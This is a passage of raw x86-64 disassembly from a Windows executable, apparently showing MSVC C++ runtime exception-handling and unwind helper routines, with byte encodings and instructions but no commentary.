   1400024db:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1400024df:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400024e3:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1400024e7:	53                   	push   %rbx
   1400024e8:	48 83 ec 70          	sub    $0x70,%rsp
   1400024ec:	48 8b d9             	mov    %rcx,%rbx
   1400024ef:	83 60 c8 00          	andl   $0x0,-0x38(%rax)
   1400024f3:	48 89 48 e0          	mov    %rcx,-0x20(%rax)
   1400024f7:	4c 89 40 e8          	mov    %r8,-0x18(%rax)
   1400024fb:	e8 2c fb ff ff       	call   0x14000202c
   140002500:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140002505:	8b 0b                	mov    (%rbx),%ecx
   140002507:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000250b:	ff 15 4f bd 00 00    	call   *0xbd4f(%rip)        # 0x14000e260
   140002511:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   140002518:	00 
   140002519:	eb 00                	jmp    0x14000251b
   14000251b:	8b 44 24 40          	mov    0x40(%rsp),%eax
   14000251f:	48 83 c4 70          	add    $0x70,%rsp
   140002523:	5b                   	pop    %rbx
   140002524:	c3                   	ret
   140002525:	cc                   	int3
   140002526:	cc                   	int3
   140002527:	cc                   	int3
   140002528:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000252d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002532:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002537:	57                   	push   %rdi
   140002538:	48 83 ec 20          	sub    $0x20,%rsp
   14000253c:	8b 79 0c             	mov    0xc(%rcx),%edi
   14000253f:	8b f2                	mov    %edx,%esi
   140002541:	48 8b e9             	mov    %rcx,%rbp
   140002544:	85 ff                	test   %edi,%edi
   140002546:	74 2b                	je     0x140002573
   140002548:	8d 5f ff             	lea    -0x1(%rdi),%ebx
   14000254b:	8b fb                	mov    %ebx,%edi
   14000254d:	e8 da fa ff ff       	call   0x14000202c
   140002552:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   140002556:	48 8b 40 60          	mov    0x60(%rax),%rax
   14000255a:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   14000255e:	48 63 45 10          	movslq 0x10(%rbp),%rax
   140002562:	48 03 c1             	add    %rcx,%rax
   140002565:	3b 70 04             	cmp    0x4(%rax),%esi
   140002568:	7e 05                	jle    0x14000256f
   14000256a:	3b 70 08             	cmp    0x8(%rax),%esi
   14000256d:	7e 06                	jle    0x140002575
   14000256f:	85 db                	test   %ebx,%ebx
   140002571:	75 d5                	jne    0x140002548
   140002573:	33 c0                	xor    %eax,%eax
   140002575:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000257a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000257f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002584:	48 83 c4 20          	add    $0x20,%rsp
   140002588:	5f                   	pop    %rdi
   140002589:	c3                   	ret
   14000258a:	cc                   	int3
   14000258b:	cc                   	int3
   14000258c:	40 53                	rex push %rbx
   14000258e:	48 83 ec 20          	sub    $0x20,%rsp
   140002592:	48 8b da             	mov    %rdx,%rbx
   140002595:	48 8b d1             	mov    %rcx,%rdx
   140002598:	48 8b cb             	mov    %rbx,%rcx
   14000259b:	e8 9c 05 00 00       	call   0x140002b3c
   1400025a0:	8b d0                	mov    %eax,%edx
   1400025a2:	48 8b cb             	mov    %rbx,%rcx
   1400025a5:	e8 7e ff ff ff       	call   0x140002528
   1400025aa:	48 85 c0             	test   %rax,%rax
   1400025ad:	0f 95 c0             	setne  %al
   1400025b0:	48 83 c4 20          	add    $0x20,%rsp
   1400025b4:	5b                   	pop    %rbx
   1400025b5:	c3                   	ret
   1400025b6:	cc                   	int3
   1400025b7:	cc                   	int3
   1400025b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400025bd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400025c2:	57                   	push   %rdi
   1400025c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400025c7:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1400025cc:	49 8b d8             	mov    %r8,%rbx
   1400025cf:	48 8b fa             	mov    %rdx,%rdi
   1400025d2:	e8 45 00 00 00       	call   0x14000261c
   1400025d7:	48 8b d7             	mov    %rdi,%rdx
   1400025da:	48 8b cb             	mov    %rbx,%rcx
   1400025dd:	48 8b f0             	mov    %rax,%rsi
   1400025e0:	e8 57 05 00 00       	call   0x140002b3c
   1400025e5:	8b d0                	mov    %eax,%edx
   1400025e7:	48 8b cb             	mov    %rbx,%rcx
   1400025ea:	e8 39 ff ff ff       	call   0x140002528
   1400025ef:	48 85 c0             	test   %rax,%rax
   1400025f2:	75 06                	jne    0x1400025fa
   1400025f4:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400025f8:	eb 04                	jmp    0x1400025fe
   1400025fa:	44 8b 48 04          	mov    0x4(%rax),%r9d
   1400025fe:	4c 8b c3             	mov    %rbx,%r8
   140002601:	48 8b d7             	mov    %rdi,%rdx
   140002604:	48 8b ce             	mov    %rsi,%rcx
   140002607:	e8 4c 17 00 00       	call   0x140003d58
   14000260c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002611:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002616:	48 83 c4 20          	add    $0x20,%rsp
   14000261a:	5f                   	pop    %rdi
   14000261b:	c3                   	ret
   14000261c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002621:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002626:	56                   	push   %rsi
   140002627:	57                   	push   %rdi
   140002628:	41 54                	push   %r12
   14000262a:	41 56                	push   %r14
   14000262c:	41 57                	push   %r15
   14000262e:	48 83 ec 20          	sub    $0x20,%rsp
   140002632:	41 8b 70 0c          	mov    0xc(%r8),%esi
   140002636:	4c 8b e1             	mov    %rcx,%r12
   140002639:	49 8b c8             	mov    %r8,%rcx
   14000263c:	49 8b f9             	mov    %r9,%rdi
   14000263f:	4d 8b f0             	mov    %r8,%r14
   140002642:	4c 8b fa             	mov    %rdx,%r15
   140002645:	e8 f2 04 00 00       	call   0x140002b3c
   14000264a:	4d 8b 14 24          	mov    (%r12),%r10
   14000264e:	8b e8                	mov    %eax,%ebp
   140002650:	4c 89 17             	mov    %r10,(%rdi)
   140002653:	eb 63                	jmp    0x1400026b8
   140002655:	49 63 46 10          	movslq 0x10(%r14),%rax
   140002659:	8d 4e ff             	lea    -0x1(%rsi),%ecx
   14000265c:	8b f1                	mov    %ecx,%esi
   14000265e:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140002662:	48 8d 1c 88          	lea    (%rax,%rcx,4),%rbx
   140002666:	49 03 5f 08          	add    0x8(%r15),%rbx
   14000266a:	3b 6b 04             	cmp    0x4(%rbx),%ebp
   14000266d:	7e 49                	jle    0x1400026b8
   14000266f:	3b 6b 08             	cmp    0x8(%rbx),%ebp
   140002672:	7f 44                	jg     0x1400026b8
   140002674:	49 8b 0f             	mov    (%r15),%rcx
   140002677:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000267c:	45 33 c0             	xor    %r8d,%r8d
   14000267f:	ff 15 bb b9 00 00    	call   *0xb9bb(%rip)        # 0x14000e040
   140002685:	4c 63 43 10          	movslq 0x10(%rbx),%r8
   140002689:	33 c9                	xor    %ecx,%ecx
   14000268b:	4c 03 44 24 50       	add    0x50(%rsp),%r8
   140002690:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   140002694:	44 8b 10             	mov    (%rax),%r10d
   140002697:	45 85 c9             	test   %r9d,%r9d
   14000269a:	74 17                	je     0x1400026b3
   14000269c:	49 8d 50 0c          	lea    0xc(%r8),%rdx
   1400026a0:	48 63 02             	movslq (%rdx),%rax
   1400026a3:	49 3b c2             	cmp    %r10,%rax
   1400026a6:	74 0b                	je     0x1400026b3
   1400026a8:	ff c1                	inc    %ecx
   1400026aa:	48 83 c2 14          	add    $0x14,%rdx
   1400026ae:	41 3b c9             	cmp    %r9d,%ecx
   1400026b1:	72 ed                	jb     0x1400026a0
   1400026b3:	41 3b c9             	cmp    %r9d,%ecx
   1400026b6:	72 06                	jb     0x1400026be
   1400026b8:	85 f6                	test   %esi,%esi
   1400026ba:	75 99                	jne    0x140002655
   1400026bc:	eb 14                	jmp    0x1400026d2
   1400026be:	49 8b 04 24          	mov    (%r12),%rax
   1400026c2:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   1400026c6:	49 63 4c 88 10       	movslq 0x10(%r8,%rcx,4),%rcx
   1400026cb:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   1400026cf:	48 89 0f             	mov    %rcx,(%rdi)
   1400026d2:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400026d7:	48 8b c7             	mov    %rdi,%rax
   1400026da:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400026df:	48 83 c4 20          	add    $0x20,%rsp
   1400026e3:	41 5f                	pop    %r15
   1400026e5:	41 5e                	pop    %r14
   1400026e7:	41 5c                	pop    %r12
   1400026e9:	5f                   	pop    %rdi
   1400026ea:	5e                   	pop    %rsi
   1400026eb:	c3                   	ret
   1400026ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400026f1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400026f6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400026fb:	57                   	push   %rdi
   1400026fc:	41 54                	push   %r12
   1400026fe:	41 55                	push   %r13
   140002700:	41 56                	push   %r14
   140002702:	41 57                	push   %r15
   140002704:	48 83 ec 40          	sub    $0x40,%rsp
   140002708:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   14000270f:	00 
   140002710:	4c 8b fa             	mov    %rdx,%r15
   140002713:	48 8b f1             	mov    %rcx,%rsi
   140002716:	49 8b d1             	mov    %r9,%rdx
   140002719:	48 8b cb             	mov    %rbx,%rcx
   14000271c:	49 8b f9             	mov    %r9,%rdi
   14000271f:	45 8b f0             	mov    %r8d,%r14d
   140002722:	8b 6b 0c             	mov    0xc(%rbx),%ebp
   140002725:	e8 12 04 00 00       	call   0x140002b3c
   14000272a:	45 33 d2             	xor    %r10d,%r10d
   14000272d:	44 8b c8             	mov    %eax,%r9d
   140002730:	85 ed                	test   %ebp,%ebp
   140002732:	0f 84 df 00 00 00    	je     0x140002817
   140002738:	4c 8b 5f 08          	mov    0x8(%rdi),%r11
   14000273c:	41 83 cc ff          	or     $0xffffffff,%r12d
   140002740:	48 63 5b 10          	movslq 0x10(%rbx),%rbx
   140002744:	45 8b c4             	mov    %r12d,%r8d
   140002747:	45 8b ec             	mov    %r12d,%r13d
   14000274a:	8b d5                	mov    %ebp,%edx
   14000274c:	8d 7a ff             	lea    -0x1(%rdx),%edi
   14000274f:	48 8d 0c bf          	lea    (%rdi,%rdi,4),%rcx
   140002753:	49 8d 04 8b          	lea    (%r11,%rcx,4),%rax
   140002757:	44 3b 4c 18 04       	cmp    0x4(%rax,%rbx,1),%r9d
   14000275c:	7e 07                	jle    0x140002765
   14000275e:	44 3b 4c 18 08       	cmp    0x8(%rax,%rbx,1),%r9d
   140002763:	7e 06                	jle    0x14000276b
   140002765:	8b d7                	mov    %edi,%edx
   140002767:	85 ff                	test   %edi,%edi
   140002769:	75 e1                	jne    0x14000274c
   14000276b:	85 d2                	test   %edx,%edx
   14000276d:	74 10                	je     0x14000277f
   14000276f:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140002772:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002776:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   14000277a:	4c 03 cb             	add    %rbx,%r9
   14000277d:	eb 03                	jmp    0x140002782
   14000277f:	4d 8b ca             	mov    %r10,%r9
   140002782:	41 8b d2             	mov    %r10d,%edx
   140002785:	49 8d 0c 1b          	lea    (%r11,%rbx,1),%rcx
   140002789:	4d 85 c9             	test   %r9,%r9
   14000278c:	74 11                	je     0x14000279f
   14000278e:	41 8b 41 04          	mov    0x4(%r9),%eax
   140002792:	39 01                	cmp    %eax,(%rcx)
   140002794:	7e 1e                	jle    0x1400027b4
   140002796:	41 8b 41 08          	mov    0x8(%r9),%eax
   14000279a:	39 41 04             	cmp    %eax,0x4(%rcx)
   14000279d:	7f 15                	jg     0x1400027b4
   14000279f:	44 3b 31             	cmp    (%rcx),%r14d
   1400027a2:	7c 10                	jl     0x1400027b4
   1400027a4:	44 3b 71 04          	cmp    0x4(%rcx),%r14d
   1400027a8:	7f 0a                	jg     0x1400027b4
   1400027aa:	45 3b c4             	cmp    %r12d,%r8d
   1400027ad:	44 8b ea             	mov    %edx,%r13d
   1400027b0:	44 0f 44 c2          	cmove  %edx,%r8d
   1400027b4:	ff c2                	inc    %edx
   1400027b6:	48 83 c1 14          	add    $0x14,%rcx
   1400027ba:	3b d5                	cmp    %ebp,%edx
   1400027bc:	72 cb                	jb     0x140002789
   1400027be:	41 8b c2             	mov    %r10d,%eax
   1400027c1:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400027c6:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400027cb:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400027d0:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400027d4:	45 3b c4             	cmp    %r12d,%r8d
   1400027d7:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400027db:	41 0f 45 c0          	cmovne %r8d,%eax
   1400027df:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400027e3:	41 8d 45 01          	lea    0x1(%r13),%eax
   1400027e7:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   1400027ec:	44 0f 45 d0          	cmovne %eax,%r10d
   1400027f0:	48 8b c6             	mov    %rsi,%rax
   1400027f3:	44 89 54 24 38       	mov    %r10d,0x38(%rsp)
   1400027f8:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   1400027fd:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140002801:	f3 0f 7f 4e 10       	movdqu %xmm1,0x10(%rsi)
   140002806:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000280a:	49 8b e3             	mov    %r11,%rsp
   14000280d:	41 5f                	pop    %r15
   14000280f:	41 5e                	pop    %r14
   140002811:	41 5d                	pop    %r13
   140002813:	41 5c                	pop    %r12
   140002815:	5f                   	pop    %rdi
   140002816:	c3                   	ret
   140002817:	e8 ac 2e 00 00       	call   0x1400056c8
   14000281c:	cc                   	int3
   14000281d:	cc                   	int3
   14000281e:	cc                   	int3
   14000281f:	cc                   	int3
   140002820:	40 55                	rex push %rbp
   140002822:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   140002827:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000282e:	48 8b 05 0b 58 01 00 	mov    0x1580b(%rip),%rax        # 0x140018040
   140002835:	48 33 c4             	xor    %rsp,%rax
   140002838:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   14000283c:	4c 8b 55 77          	mov    0x77(%rbp),%r10
   140002840:	48 8d 05 39 ca 00 00 	lea    0xca39(%rip),%rax        # 0x14000f280
   140002847:	0f 10 00             	movups (%rax),%xmm0
   14000284a:	4c 8b d9             	mov    %rcx,%r11
   14000284d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002852:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002856:	0f 11 01             	movups %xmm0,(%rcx)
   140002859:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   14000285d:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140002861:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140002865:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140002869:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   14000286d:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140002871:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140002875:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140002879:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   14000287d:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140002881:	0f 10 88 80 00 00 00 	movups 0x80(%rax),%xmm1
   140002888:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   14000288c:	0f 10 40 70          	movups 0x70(%rax),%xmm0
   140002890:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   140002897:	0f 11 41 70          	movups %xmm0,0x70(%rcx)
   14000289b:	0f 11 89 80 00 00 00 	movups %xmm1,0x80(%rcx)
   1400028a2:	48 89 81 90 00 00 00 	mov    %rax,0x90(%rcx)
   1400028a9:	48 8d 05 38 12 00 00 	lea    0x1238(%rip),%rax        # 0x140003ae8
   1400028b0:	49 8b 0b             	mov    (%r11),%rcx
   1400028b3:	48 89 45 8f          	mov    %rax,-0x71(%rbp)
   1400028b7:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   1400028bb:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   1400028bf:	48 63 45 5f          	movslq 0x5f(%rbp),%rax
   1400028c3:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   1400028c7:	48 8b 45 57          	mov    0x57(%rbp),%rax
   1400028cb:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1400028cf:	0f b6 45 7f          	movzbl 0x7f(%rbp),%eax
   1400028d3:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   1400028d7:	49 8b 42 40          	mov    0x40(%r10),%rax
   1400028db:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400028e0:	49 8b 42 28          	mov    0x28(%r10),%rax
   1400028e4:	4c 89 4d 97          	mov    %r9,-0x69(%rbp)
   1400028e8:	45 33 c9             	xor    %r9d,%r9d
   1400028eb:	4c 89 45 af          	mov    %r8,-0x51(%rbp)
   1400028ef:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400028f4:	48 89 55 bf          	mov    %rdx,-0x41(%rbp)
   1400028f8:	49 8b 12             	mov    (%r10),%rdx
   1400028fb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002900:	48 c7 45 cf 20 05 93 	movq   $0x19930520,-0x31(%rbp)
   140002907:	19 
   140002908:	ff 15 7a b7 00 00    	call   *0xb77a(%rip)        # 0x14000e088
   14000290e:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   140002912:	48 33 cc             	xor    %rsp,%rcx
   140002915:	e8 b6 a2 00 00       	call   0x14000cbd0
   14000291a:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   140002921:	5d                   	pop    %rbp
   140002922:	c3                   	ret
   140002923:	cc                   	int3
   140002924:	40 53                	rex push %rbx
   140002926:	48 83 ec 20          	sub    $0x20,%rsp
   14000292a:	48 8b d9             	mov    %rcx,%rbx
   14000292d:	48 89 11             	mov    %rdx,(%rcx)
   140002930:	e8 f7 f6 ff ff       	call   0x14000202c
   140002935:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   140002939:	73 0b                	jae    0x140002946
   14000293b:	e8 ec f6 ff ff       	call   0x14000202c
   140002940:	48 8b 48 58          	mov    0x58(%rax),%rcx
   140002944:	eb 02                	jmp    0x140002948
   140002946:	33 c9                	xor    %ecx,%ecx
   140002948:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   14000294c:	e8 db f6 ff ff       	call   0x14000202c
   140002951:	48 89 58 58          	mov    %rbx,0x58(%rax)
   140002955:	48 8b c3             	mov    %rbx,%rax
   140002958:	48 83 c4 20          	add    $0x20,%rsp
   14000295c:	5b                   	pop    %rbx
   14000295d:	c3                   	ret
   14000295e:	cc                   	int3
   14000295f:	cc                   	int3
   140002960:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002965:	57                   	push   %rdi
   140002966:	48 83 ec 20          	sub    $0x20,%rsp
   14000296a:	48 8b f9             	mov    %rcx,%rdi
   14000296d:	e8 ba f6 ff ff       	call   0x14000202c
   140002972:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   140002976:	75 35                	jne    0x1400029ad
   140002978:	e8 af f6 ff ff       	call   0x14000202c
   14000297d:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140002981:	48 85 d2             	test   %rdx,%rdx
   140002984:	74 27                	je     0x1400029ad
   140002986:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   14000298a:	48 3b fa             	cmp    %rdx,%rdi
   14000298d:	74 0a                	je     0x140002999
   14000298f:	48 8b d3             	mov    %rbx,%rdx
   140002992:	48 85 db             	test   %rbx,%rbx
   140002995:	74 16                	je     0x1400029ad
   140002997:	eb ed                	jmp    0x140002986
   140002999:	e8 8e f6 ff ff       	call   0x14000202c
   14000299e:	48 89 58 58          	mov    %rbx,0x58(%rax)
   1400029a2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400029a7:	48 83 c4 20          	add    $0x20,%rsp
   1400029ab:	5f                   	pop    %rdi
   1400029ac:	c3                   	ret
   1400029ad:	e8 16 2d 00 00       	call   0x1400056c8
   1400029b2:	cc                   	int3
   1400029b3:	cc                   	int3
   1400029b4:	48 83 ec 28          	sub    $0x28,%rsp
   1400029b8:	e8 6f f6 ff ff       	call   0x14000202c
   1400029bd:	48 8b 40 60          	mov    0x60(%rax),%rax
   1400029c1:	48 83 c4 28          	add    $0x28,%rsp
   1400029c5:	c3                   	ret
   1400029c6:	cc                   	int3
   1400029c7:	cc                   	int3
   1400029c8:	48 83 ec 28          	sub    $0x28,%rsp
   1400029cc:	e8 5b f6 ff ff       	call   0x14000202c
   1400029d1:	48 8b 40 68          	mov    0x68(%rax),%rax
   1400029d5:	48 83 c4 28          	add    $0x28,%rsp
   1400029d9:	c3                   	ret
   1400029da:	cc                   	int3
   1400029db:	cc                   	int3
   1400029dc:	40 53                	rex push %rbx
   1400029de:	48 83 ec 20          	sub    $0x20,%rsp
   1400029e2:	48 8b d9             	mov    %rcx,%rbx
   1400029e5:	e8 42 f6 ff ff       	call   0x14000202c
   1400029ea:	48 89 58 60          	mov    %rbx,0x60(%rax)
   1400029ee:	48 83 c4 20          	add    $0x20,%rsp
   1400029f2:	5b                   	pop    %rbx
   1400029f3:	c3                   	ret
   1400029f4:	40 53                	rex push %rbx
   1400029f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400029fa:	48 8b d9             	mov    %rcx,%rbx
   1400029fd:	e8 2a f6 ff ff       	call   0x14000202c
   140002a02:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140002a06:	48 83 c4 20          	add    $0x20,%rsp
   140002a0a:	5b                   	pop    %rbx
   140002a0b:	c3                   	ret
   140002a0c:	48 8b c4             	mov    %rsp,%rax
   140002a0f:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140002a13:	48 89 68 18          	mov    %rbp,0x18(%rax)
   140002a17:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140002a1b:	57                   	push   %rdi
   140002a1c:	48 83 ec 40          	sub    $0x40,%rsp
   140002a20:	49 8b 59 08          	mov    0x8(%r9),%rbx
   140002a24:	49 8b f9             	mov    %r9,%rdi
   140002a27:	49 8b f0             	mov    %r8,%rsi
   140002a2a:	48 89 50 08          	mov    %rdx,0x8(%rax)
   140002a2e:	48 8b e9             	mov    %rcx,%rbp
   140002a31:	e8 f6 f5 ff ff       	call   0x14000202c
   140002a36:	48 89 58 60          	mov    %rbx,0x60(%rax)
   140002a3a:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   140002a3e:	e8 e9 f5 ff ff       	call   0x14000202c
   140002a43:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140002a47:	e8 e0 f5 ff ff       	call   0x14000202c
   140002a4c:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140002a50:	4c 8b cf             	mov    %rdi,%r9
   140002a53:	4c 8b c6             	mov    %rsi,%r8
   140002a56:	8b 11                	mov    (%rcx),%edx
   140002a58:	48 8b cd             	mov    %rbp,%rcx
   140002a5b:	48 03 50 60          	add    0x60(%rax),%rdx
   140002a5f:	33 c0                	xor    %eax,%eax
   140002a61:	88 44 24 38          	mov    %al,0x38(%rsp)
   140002a65:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002a6a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002a6e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002a73:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002a78:	e8 7b 0f 00 00       	call   0x1400039f8
   140002a7d:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002a82:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002a87:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140002a8c:	48 83 c4 40          	add    $0x40,%rsp
   140002a90:	5f                   	pop    %rdi
   140002a91:	c3                   	ret
   140002a92:	cc                   	int3
   140002a93:	cc                   	int3
   140002a94:	cc                   	int3
   140002a95:	cc                   	int3
   140002a96:	cc                   	int3
   140002a97:	cc                   	int3
   140002a98:	cc                   	int3
   140002a99:	cc                   	int3
   140002a9a:	cc                   	int3
   140002a9b:	cc                   	int3
   140002a9c:	cc                   	int3
   140002a9d:	cc                   	int3
   140002a9e:	cc                   	int3
   140002a9f:	cc                   	int3
   140002aa0:	48 83 ec 28          	sub    $0x28,%rsp
   140002aa4:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   140002aa8:	4d 8b d0             	mov    %r8,%r10
   140002aab:	48 8b 01             	mov    (%rcx),%rax
   140002aae:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   140002ab2:	83 f8 fe             	cmp    $0xfffffffe,%eax
   140002ab5:	75 0b                	jne    0x140002ac2
   140002ab7:	4c 8b 02             	mov    (%rdx),%r8
   140002aba:	49 8b ca             	mov    %r10,%rcx
   140002abd:	e8 82 00 00 00       	call   0x140002b44
   140002ac2:	48 83 c4 28          	add    $0x28,%rsp
   140002ac6:	c3                   	ret
   140002ac7:	cc                   	int3
   140002ac8:	40 53                	rex push %rbx
   140002aca:	48 83 ec 20          	sub    $0x20,%rsp
   140002ace:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140002ad3:	49 8b d8             	mov    %r8,%rbx
   140002ad6:	e8 41 fb ff ff       	call   0x14000261c
   140002adb:	48 8b 08             	mov    (%rax),%rcx
   140002ade:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   140002ae2:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002ae7:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   140002aeb:	48 83 c4 20          	add    $0x20,%rsp
   140002aef:	5b                   	pop    %rbx
   140002af0:	c3                   	ret
   140002af1:	cc                   	int3
   140002af2:	cc                   	int3
   140002af3:	cc                   	int3
   140002af4:	48 63 52 1c          	movslq 0x1c(%rdx),%rdx
   140002af8:	48 8b 01             	mov    (%rcx),%rax
   140002afb:	44 89 04 02          	mov    %r8d,(%rdx,%rax,1)
   140002aff:	c3                   	ret
   140002b00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002b05:	57                   	push   %rdi
   140002b06:	48 83 ec 20          	sub    $0x20,%rsp
   140002b0a:	41 8b f9             	mov    %r9d,%edi
   140002b0d:	49 8b d8             	mov    %r8,%rbx
   140002b10:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140002b15:	e8 02 fb ff ff       	call   0x14000261c
   140002b1a:	48 8b 08             	mov    (%rax),%rcx
   140002b1d:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   140002b21:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002b26:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   140002b2a:	7e 04                	jle    0x140002b30
   140002b2c:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   140002b30:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002b35:	48 83 c4 20          	add    $0x20,%rsp
   140002b39:	5f                   	pop    %rdi
   140002b3a:	c3                   	ret
   140002b3b:	cc                   	int3
   140002b3c:	4c 8b 02             	mov    (%rdx),%r8
   140002b3f:	e9 00 00 00 00       	jmp    0x140002b44
   140002b44:	40 53                	rex push %rbx
   140002b46:	48 83 ec 20          	sub    $0x20,%rsp
   140002b4a:	49 8b d8             	mov    %r8,%rbx
   140002b4d:	48 85 c9             	test   %rcx,%rcx
   140002b50:	74 52                	je     0x140002ba4
   140002b52:	4c 63 59 18          	movslq 0x18(%rcx),%r11
   140002b56:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   140002b5a:	4b 8d 04 1a          	lea    (%r10,%r11,1),%rax
   140002b5e:	48 85 c0             	test   %rax,%rax
   140002b61:	74 41                	je     0x140002ba4
   140002b63:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   140002b67:	45 33 c9             	xor    %r9d,%r9d
   140002b6a:	45 85 c0             	test   %r8d,%r8d
   140002b6d:	74 30                	je     0x140002b9f
   140002b6f:	4b 8d 0c cb          	lea    (%r11,%r9,8),%rcx
   140002b73:	4a 63 14 11          	movslq (%rcx,%r10,1),%rdx
   140002b77:	49 03 d2             	add    %r10,%rdx
   140002b7a:	48 3b da             	cmp    %rdx,%rbx
   140002b7d:	72 08                	jb     0x140002b87
   140002b7f:	41 ff c1             	inc    %r9d
   140002b82:	45 3b c8             	cmp    %r8d,%r9d
   140002b85:	72 e8                	jb     0x140002b6f
   140002b87:	45 85 c9             	test   %r9d,%r9d
   140002b8a:	74 13                	je     0x140002b9f
